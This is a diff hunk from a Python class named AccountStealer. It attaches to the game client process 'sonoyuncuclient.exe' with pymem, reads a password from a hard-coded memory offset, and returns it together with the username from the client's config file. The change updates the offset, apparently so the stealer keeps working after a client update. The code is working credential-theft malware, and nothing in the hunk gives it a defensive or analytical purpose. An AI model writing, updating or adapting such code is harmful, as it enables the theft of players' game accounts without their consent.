@@ -97,7 +97,7 @@ class AccountStealer:
                 process_memory = pymem.Pymem(process_id)
                 base_address = pymem.process.module_from_name(process_memory.process_handle, "sonoyuncuclient.exe").lpBaseOfDll
 
-                password = re.search(r'[A-Za-z0-9._\-@+#$%^&*=!?~\'\",\\|/:<>[\]{}()]{1,128}', process_memory.read_bytes(base_address + 0x1C6900, 100).decode('utf-8', errors='ignore')).group(0)
+                password = re.search(r'[A-Za-z0-9._\-@+#$%^&*=!?~\'\",\\|/:<>[\]{}()]{1,128}', process_memory.read_bytes(base_address + 0x1ebbb0, 100).decode('utf-8', errors='ignore')).group(0)
 
                 return json.load(open(CONFIG_PATH))["userName"], password
             except:
